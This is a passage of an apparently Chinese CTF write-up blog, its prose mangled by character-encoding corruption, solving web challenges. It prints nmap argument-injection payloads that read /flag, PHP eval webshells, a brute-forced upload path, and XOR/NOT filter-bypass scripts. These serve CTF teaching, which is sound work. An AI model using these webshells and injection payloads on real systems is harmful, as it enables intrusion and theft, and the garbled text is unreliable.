title="2020-ç½‘é¼æ¯-æœ±é›€ç»„-Web-nmap"></a>2020-ç½‘é¼æ¯-æœ±é›€ç»„-Web-nmap</h2><p>ä¸buuctfä¸Šçš„[BUUCTF 2018]Online Toolå¾ˆåƒ</p><h3 id="hintsï¼š"><a href="#hintsï¼š" class="headerlink" title="hintsï¼š"></a>hintsï¼š</h3><p>flag is in /flag</p><h3 id="çŸ¥è¯†ç‚¹ï¼š"><a href="#çŸ¥è¯†ç‚¹ï¼š" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h3><p>1.<a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">escapeshellarg()+escapeshellcmd()</a>ä¸¤ä¸ªå‡½æ•°å¹¶ç”¨å¯¼è‡´çš„å¤šä¸ªå‚æ•°çš„æ³¨å…¥</p><p>2.nmapå‘½ä»¤å‚æ•°ï¼š</p><p>-oN æ ‡å‡†ä¿å­˜<br>-oX XMLä¿å­˜<br>-oG Grepä¿å­˜<br>-oA ä¿å­˜åˆ°æ‰€æœ‰æ ¼å¼<br>-append-output è¡¥å……ä¿å­˜æ–‡ä»¶</p><h3 id="bypassç»†èŠ‚ï¼š"><a href="#bypassç»†èŠ‚ï¼š" class="headerlink" title="bypassç»†èŠ‚ï¼š"></a>bypassç»†èŠ‚ï¼š</h3><p>ä¼ å…¥127.0â€™ -oG</p><p>ç»è¿‡escapeshellarg()å‡½æ•°å¤„ç†ï¼ˆå…ˆè½¬ä¹‰å•å¼•å·ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†çš„çš„å‚æ•°æ‹¬èµ·æ¥ï¼Œè¢«è½¬ä¹‰çš„å•å¼•å·ä¸åœ¨èŒƒå›´ä¹‹å†…ï¼‰ï¼š</p><p>1.<code>127.0\&#39; -oG</code></p><p>2.<code>&#39;127.0&#39;\&#39; &#39;-oG&#39;</code></p><p>ç„¶åç»è¿‡<a href="https://www.php.net/manual/zh/function.escapeshellcmd.php" target="_blank" rel="noopener">escapeshellcmd()å‡½æ•°</a>å¤„ç†ï¼ˆåœ¨linuxç³»ç»Ÿä¸­&amp;#;`|*?~&lt;&gt;^()[]{}$\, \x0Aå’Œ \xFFå°†ä¼šè¢«è½¬ä¹‰ã€‚ â€˜ å’Œ â€œä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚ï¼‰ï¼š</p><p><code>&#39;127.0&#39;\\&#39;&#39;-oG\&#39;</code>è¿™æ ·çš„è¯\å…ˆè¢«è½¬ä¹‰äº†ï¼Œç„¶åå…¶åé¢çš„å•å¼•å·å°±ä¸ä¸‹ä¸€ä¸ªå•å¼•å·åˆå¹¶å˜æˆäº†â€™â€™ä¹Ÿå°±å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ‹¬äº†ä¸€ä¸ªç©ºå€¼ï¼Œä¹Ÿå°±ç­‰äºå•¥ä¹Ÿæ²¡æœ‰ï¼Œå°±å¯ä»¥è¢«å¿½ç•¥äº†ï¼Œè¿™æ ·æœ€åçš„å•å¼•å·æ²¡æœ‰é…å¯¹çš„æ‰€ä»¥ä¹Ÿä¼šè¢«è½¬ä¹‰æœ€åå˜æˆï¼šâ€™127.0â€™\ -oGâ€™ä¹Ÿå°±æ˜¯127.0\ -oGâ€™</p><p>ä¹Ÿå°±æ˜¯ç”±ä¸€å¼€å§‹çš„å½¢æ€127.0â€™ -oGå˜æˆäº†127.0\ -oGâ€™ä¹Ÿå°±æ˜¯è¯´å•å¼•å·ä¼šè¢«å»æ‰å˜æˆ\</p><h3 id="è§£æ³•ä¸€ï¼š"><a href="#è§£æ³•ä¸€ï¼š" class="headerlink" title="è§£æ³•ä¸€ï¼š"></a>è§£æ³•ä¸€ï¼š</h3><p>åˆ©ç”¨nmapå‚æ•°-iLæ¥è¯»å–/flagç„¶ååˆ©ç”¨-oNå°†æ‰«æç»“æœæ‰“å°åˆ°ä¸€ä¸ªå¯è¯»æ–‡ä»¶ä¸­ï¼Œç„¶åè®¿é—®å³å¯</p><pre><code>&#39; -iL /flag -oN flag.txt &#39;</code></pre><p>è®¿é—®flag.txtå³å¯</p><h3 id="è§£æ³•äºŒï¼š"><a href="#è§£æ³•äºŒï¼š" class="headerlink" title="è§£æ³•äºŒï¼š"></a>è§£æ³•äºŒï¼š</h3><p>åˆ©ç”¨nmapçš„-oGå‚æ•°å°†å‘½ä»¤å’Œç»“æœå†™å…¥ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ï¼š</p><p>ç”±äºphpè¢«è¿‡æ»¤æ‰€ä»¥éœ€è¦ç”¨&lt;?=æ¥bypass</p><pre><code>&#39; &lt;?= @eval($_POST[a]);?&gt; -oG shell.phtml &#39;</code></pre><p>ç„¶åç«ç‹ä¼ å…¥postå‚æ•°ï¼š</p><p>a=system(â€˜cat /flagâ€™);</p><h2 id="2017-èµ›å®¢å¤ä»¤è¥-Web-Uploadddd"><a href="#2017-èµ›å®¢å¤ä»¤è¥-Web-Uploadddd" class="headerlink" title="2017-èµ›å®¢å¤ä»¤è¥-Web-Uploadddd"></a>2017-èµ›å®¢å¤ä»¤è¥-Web-Uploadddd</h2><p>é¦–å…ˆåˆ©ç”¨åå°æ³„éœ²å°å­—å…¸fuzzä¸€æ³¢ï¼Œå¾—åˆ°<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B405%E6%9C%8809%E6%97%A51030_1.png" alt></p><p>æ‰“å¼€è™šæ‹Ÿæœºvim -r index.php.swpæ¢å¤ä¸€ä¸‹å¾—åˆ°æºä»£ç ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B405%E6%9C%8809%E6%97%A51050_2.png" alt></p><p>ä»£ç å®¡è®¡ï¼š</p><p>æ—¶é—´æˆ³+0-999ä»»æ„æ•°å­—+.phpæ„æˆä¸Šä¼ çš„æ–‡ä»¶å</p><p>bypassï¼š</p><p>æŠ“åŒ…å¾—åˆ°æ—¶é—´æˆ³ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B405%E6%9C%8809%E6%97%A51057_3.png" alt></p><p>20210509025638+0-999+.php</p><p>åˆ©ç”¨æ”»å‡»ç‰ˆå—çˆ†ç ´0-999å¾—åˆ°è·¯å¾„ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B405%E6%9C%8809%E6%97%A51130_4.png" alt></p><p>uploads/20210509032726948.php</p><p>èšå‰‘æ•´ä¸Šï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B405%E6%9C%8809%E6%97%A51132_5.png" alt></p><h2 id="2021-ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›-Web-find-it"><a href="#2021-ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›-Web-find-it" class="headerlink" title="2021-ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›-Web-find_it"></a>2021-ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›-Web-find_it</h2><p>å¤‡ä»½æ³„éœ²å­—å…¸æ‰«å®Œä»¥åå‘ç°äº†robots.txtå“åº”ä¸º200ï¼Œå¾—åˆ°æç¤ºï¼š1ndexx.php</p><p>æ— æ³•ç›´æ¥è®¿é—®ï¼Œç»§ç»­å°è¯•/.1ndexx.php.swpï¼Œå¾—åˆ°æºç ï¼š</p><pre class="line-numbers language-php+html"><code class="language-php+html"><?php#Really easy...$file=fopen("flag.php","r") or die("Unable 2 open!");$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize("flag.php"));$hack=fopen("hack.php","w") or die("Unable 2 open");$a=$_GET['code'];if(preg_match('/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/',$a)){    die("you die");}if(strlen($a)>33){    die("nonono.");}fwrite($hack,$a);fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);fclose($file);fclose($hack);?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.runoob.com/php/func-filesystem-fread.html" target="_blank" rel="noopener">freadå‡½æ•°</a></p><p>ä»£ç å®¡è®¡åˆ°<a href="https://www.runoob.com/php/func-filesystem-fwrite.html" target="_blank" rel="noopener">fwriteå‡½æ•°</a>ï¼Œè€Œä¸”æ˜¯å°†getä¼ å‡ºçš„å‚æ•°å†™è¿›å»ï¼Œå¯ä»¥è€ƒè™‘ä¸€å¥è¯æœ¨é©¬ï¼ŒåŒæ—¶ä¼ å…¥çš„å‚æ•°ä¸èƒ½å¤§äº33ä¸ªå­—ç¬¦ï¼ŒåŒæ—¶è¿˜ä¼šå°†flag.phpä¸­çš„å†…å®¹è¯»å†™åˆ°hack.phpï¼Œè§£æ³•ä¸€ï¼šæ²¡æœ‰è¿‡æ»¤Evalï¼Œ</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">Eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'hack'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åèšå‰‘è¿æ¥å³å¯ï¼šxxx.xxx.xxx.xxx/hack.php</p><p>è§£æ³•äºŒï¼š</p><p>å†™å…¥</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2016-è¥¿æ™®æ¯äº¬æ´¥å†€ä¿¡æ¯å®‰å…¨æŒ‘æˆ˜èµ›-Web-web01"><a href="#2016-è¥¿æ™®æ¯äº¬æ´¥å†€ä¿¡æ¯å®‰å…¨æŒ‘æˆ˜èµ›-Web-web01" class="headerlink" title="2016-è¥¿æ™®æ¯äº¬æ´¥å†€ä¿¡æ¯å®‰å…¨æŒ‘æˆ˜èµ›-Web-web01"></a>2016-è¥¿æ™®æ¯äº¬æ´¥å†€ä¿¡æ¯å®‰å…¨æŒ‘æˆ˜èµ›-Web-web01</h2><p>robots.txtæ–‡ä»¶æ³„éœ²ï¼Œéœ€è¦å…ˆå°†re2ç»™æå‡ºæ¥</p><p>å¾—åˆ°ç”¨æˆ·åï¼šadminå¯†ç ï¼š328du919sud9</p><p>ç™»é™†åæ˜¾ç¤ºFlag is Not Here! </p><p>æŠ“åŒ…å¯¹is_loginè¿›è¡Œä¿®æ”¹ï¼Œå°†0å˜æˆ1</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B405%E6%9C%8819%E6%97%A50906_1.png" alt></p><h2 id="2016-è¥¿æ™®æ¯äº¬æ´¥å†€ä¿¡æ¯å®‰å…¨æŒ‘æˆ˜èµ›-Web-web02"><a href="#2016-è¥¿æ™®æ¯äº¬æ´¥å†€ä¿¡æ¯å®‰å…¨æŒ‘æˆ˜èµ›-Web-web02" class="headerlink" title="2016-è¥¿æ™®æ¯äº¬æ´¥å†€ä¿¡æ¯å®‰å…¨æŒ‘æˆ˜èµ›-Web-web02"></a>2016-è¥¿æ™®æ¯äº¬æ´¥å†€ä¿¡æ¯å®‰å…¨æŒ‘æˆ˜èµ›-Web-web02</h2><p>å­—å…¸ç»“åˆburpè¿›è¡ŒåŠè‡ªåŠ¨åŒ–æ‰«æä¸€æŠŠï¼Œå‘ç°robots.txtå¾—åˆ°éƒ¨åˆ†ä¿¡æ¯ï¼š</p><p>Powered By Copyright 2012 - 2016 Vwins All Right Reserved.</p><p>å¾—çŸ¥æ˜¯Vwins cmsçš„ç¯å¢ƒï¼Œåœ¨è¯¥ç¯å¢ƒä¸‹å­˜åœ¨ä¸€ä¸ªGETæ–¹å¼æ·»åŠ â€allowed=*â€ç»•è¿‡ä¸Šä¼ é™åˆ¶çš„æ¼æ´ã€‚</p><p>å¦å¤–è¿˜æœ‰ä¸€ç‚¹åç«¯çš„é™åˆ¶ï¼Œéœ€è¦ä¿®æ”¹ä¸€ä¸‹æ–‡ä»¶çš„ä¸Šä¼ ç±»å‹</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B405%E6%9C%8817%E6%97%A51959_1.png" alt></p><h2 id="2020-ç¬¬äº”ç©ºé—´æ™ºèƒ½å®‰å…¨å¤§èµ›-web-hate-php"><a href="#2020-ç¬¬äº”ç©ºé—´æ™ºèƒ½å®‰å…¨å¤§èµ›-web-hate-php" class="headerlink" title="2020-ç¬¬äº”ç©ºé—´æ™ºèƒ½å®‰å…¨å¤§èµ›-web-hate-php"></a>2020-ç¬¬äº”ç©ºé—´æ™ºèƒ½å®‰å…¨å¤§èµ›-web-hate-php</h2><h3 id="çŸ¥è¯†æ‹“å±•ï¼š"><a href="#çŸ¥è¯†æ‹“å±•ï¼š" class="headerlink" title="çŸ¥è¯†æ‹“å±•ï¼š"></a>çŸ¥è¯†æ‹“å±•ï¼š</h3><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">æ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡</a></p><p>å…¶ä¸­åŒ…æ‹¬äº†å‘½ä»¤æ‰§è¡Œçš„æ–°æ–¹å¼</p><h3 id="é¢˜ç›®ï¼š-1"><a href="#é¢˜ç›®ï¼š-1" class="headerlink" title="é¢˜ç›®ï¼š"></a>é¢˜ç›®ï¼š</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/(f|l|a|g|\.|p|h|\/|;|\"|\'|\`|\||\[|\]|\_|=)/i'</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'You are too good for me'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token function">get_defined_functions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'internal'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token string">'/im'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'You deserve better'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$blacklistçš„å€¼æ˜¯æ‰€æœ‰çš„å†…ç½®å‡½æ•°</p><h3 id="è§£é¢˜æ€è·¯ï¼š"><a href="#è§£é¢˜æ€è·¯ï¼š" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h3><h4 id="æ–¹æ³•ä¸€ï¼š"><a href="#æ–¹æ³•ä¸€ï¼š" class="headerlink" title="æ–¹æ³•ä¸€ï¼š"></a>æ–¹æ³•ä¸€ï¼š</h4><p>1.åˆ©ç”¨å¼‚æˆ–æ¥ç»•è¿‡ï¼šåœ¨phpä¸­ä¸¤ä¸ªå­—ç¬¦ä¸²è¿›è¡Œå¼‚æˆ–æ“ä½œä»¥åï¼Œå¾—åˆ°çš„è¿˜æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²</p><p>å¯ä»¥åˆ©ç”¨å¦‚ä¸‹phpè„šæœ¬æ¥å®ç°ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token string">'phpinfo()'</span><span class="token punctuation">;</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$l</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$l</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$l</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$flag</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">128</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">128</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$payload</span><span class="token punctuation">[</span><span class="token variable">$l</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token punctuation">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token string">'^'</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token string">'='</span> <span class="token punctuation">.</span> <span class="token variable">$payload</span><span class="token punctuation">[</span><span class="token variable">$l</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>                <span class="token variable">$flag</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token operator">===</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">.</span><span class="token string">'^'</span><span class="token punctuation">.</span><span class="token variable">$b</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾—åˆ°ï¼š</p><pre><code>%80^%F0=p%80^%E8=h%80^%F0=p%80^%E9=i%80^%EE=n%80^%E6=f%80^%EF=o%80^%A8=(%80^%A9=)%80%80%80%80%80%80%80%80%80^%F0%E8%F0%E9%EE%E6%EF%A8%A9</code></pre><p>ç„¶åç»“åˆphp7çš„æ–°çš„æ‰§è¡ŒåŠ¨æ€å‡½æ•°çš„æ–¹æ³•ä¹Ÿå°±æ˜¯(â€˜phpinfoâ€™)()æ¥å®ç°å‘½ä»¤æ‰§è¡Œ</p><p>ä¹Ÿå°±æ˜¯å¯ä»¥ç»§ç»­åˆ©ç”¨(system)(ls)æ¥ç»§ç»­æŸ¥çœ‹å½“å‰çš„ç›®å½•ä¸­çš„å†…å®¹</p><p>ç„¶ååˆ©ç”¨(show_source)(flag.php)</p><p>(%80%80%80%80%80%80%80%80%80%80%80^%F3%E8%EF%F7%DF%F3%EF%F5%F2%E3%E5)(%80%80%80%80%80%80%80%80^%E6%EC%E1%E7%AE%F0%E8%F0)</p><h4 id="æ–¹æ³•äºŒï¼š"><a href="#æ–¹æ³•äºŒï¼š" class="headerlink" title="æ–¹æ³•äºŒï¼š"></a>æ–¹æ³•äºŒï¼š</h4><p>æ­¤æ–¹æ³•åªé€‚ç”¨äºphp7</p><pre><code>&lt;?phpecho urlencode(~&#39;highlight_file&#39;);  //%97%96%98%97%93%96%98%97%8B%A0%99%96%93%9Aecho &quot;\n&quot;;echo urlencode(~&#39;flag.php&#39;); //%99%93%9E%98%D1%8F%97%8F?&gt;</code></pre><p>åˆ©ç”¨å–åæ¥å®ç°å‘½ä»¤æ‰§è¡Œï¼Œç»•è¿‡æ­£åˆ™åŒ¹é…çš„æ–¹æ³•ä¸ä¸Šé¢ç›¸åŒï¼Œä½¿ç”¨äº®é«˜æ‰“å°flagï¼š(highlight_file)(flag.php)</p><p>(<del>%97%96%98%97%93%96%98%97%8B%A0%99%96%93%9A)(</del>%99%93%9E%98%D1%8F%97%8F)</p><h2 id="2021-ç¬¬äº”å±Šä¸–ç•Œæ™ºèƒ½å¤§ä¼š-ã€Œæ´¥é—¨æ¯ã€å›½é™…ç½‘ç»œå®‰å…¨åˆ›æ–°å¤§èµ›-Web-hate-php"><a href="#2021-ç¬¬äº”å±Šä¸–ç•Œæ™ºèƒ½å¤§ä¼š-ã€Œæ´¥é—¨æ¯ã€å›½é™…ç½‘ç»œå®‰å…¨åˆ›æ–°å¤§èµ›-Web-hate-php" class="headerlink" title="2021-ç¬¬äº”å±Šä¸–ç•Œæ™ºèƒ½å¤§ä¼š-ã€Œæ´¥é—¨æ¯ã€å›½é™…ç½‘ç»œå®‰å…¨åˆ›æ–°å¤§èµ›-Web-hate_php"></a>2021-ç¬¬äº”å±Šä¸–ç•Œæ™ºèƒ½å¤§ä¼š-ã€Œæ´¥é—¨æ¯ã€å›½é™…ç½‘ç»œå®‰å…¨åˆ›æ–°å¤§èµ›-Web-hate_php</h2><h3 id="é¢˜ç›®ï¼š-2"><a href="#é¢˜ç›®ï¼š-2" class="headerlink" title="é¢˜ç›®ï¼š"></a>é¢˜ç›®ï¼š</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[A-Za-z0-9_$@]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fighting!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤é¢˜ç›®è¿‡æ»¤äº†æ‰€æœ‰çš„å­—æ¯å’Œæ•°å­—ä»¥åŠä¸‹åˆ’çº¿$@ç¬¦å·ï¼Œè¿™ç§æ— æ•Œçš„è¿‡æ»¤ï¼Œåªæœ‰ç¥æ‰èƒ½åšå‡ºæ¥ï¼Œæ¬²åšæ­¤é¢˜ï¼Œå…ˆçœ‹<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">pç¥çš„æ–‡ç« </a></p><h3 id="è§£é¢˜æ€è·¯ï¼š-1"><a href="#è§£é¢˜æ€è·¯ï¼š-1" class="headerlink" 